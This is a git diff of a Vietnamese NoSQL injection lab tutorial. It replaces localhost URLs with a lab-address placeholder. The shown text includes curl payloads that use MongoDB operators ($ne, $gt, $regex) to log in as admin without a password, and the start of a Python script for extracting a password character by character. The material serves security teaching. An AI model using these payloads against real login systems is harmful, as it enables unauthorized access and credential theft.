@@ -71,7 +71,10 @@ db.users.findOne({ username: "admin", password: { $ne: "invalid" } });
 ```bash
 cd nosql-injection/lab
 docker compose up -d
-# Lab tại: http://localhost:7106
+
+> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.
+
+# Lab tại: <LAB_ADDRESS>
 ```
 
 Lab là một API login (Node.js + Express + MongoDB), nhận JSON qua `POST /api/login`. DB có collection `users` với user `admin` (password hash) và `guest`.
@@ -81,7 +84,7 @@ Lab là một API login (Node.js + Express + MongoDB), nhận JSON qua `POST /ap
 ### Bước 2: Xác nhận app dùng JSON
 
 ```bash
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"guest","password":"guest123"}'
 {"success":true,"role":"user"}
@@ -94,7 +97,7 @@ $ curl -s http://localhost:7106/api/login -X POST \
 ### Bước 3: Bypass với `$ne` — đăng nhập admin không cần mật khẩu
 
 ```bash
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$ne":""}}'
 {"success":true,"role":"admin","flag":"FLAG{n0sql_0p3r4t0r_2026}"}
@@ -108,12 +111,12 @@ $ curl -s http://localhost:7106/api/login -X POST \
 
 ```bash
 # $gt: password > "" (bất kỳ chuỗi không rỗng nào) — bypass tương tự
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$gt":""}}'
 
 # $regex: password có chứa chữ a (bắt đầu bằng bất kỳ + a)
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$regex":".*a.*"}}'
 ```
@@ -126,7 +129,7 @@ Giống blind SQLi — hỏi từng ký tự của password admin:
 
 ```bash
 # Ký tự đầu là 'f'?
-$ curl -s http://localhost:7106/api/login -X POST \
+$ curl -s <LAB_ADDRESS>/api/login -X POST \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":{"$regex":"^f"}}'
 ```
@@ -140,7 +143,7 @@ $ curl -s http://localhost:7106/api/login -X POST \
 ```python
 import requests, string
 
-url = "http://localhost:7106/api/login"
+url = "<LAB_ADDRESS>/api/login"
 charset = string.ascii_lowercase + string.digits + "_{}@.-"
 password = ""
 for i in range(1, 40):
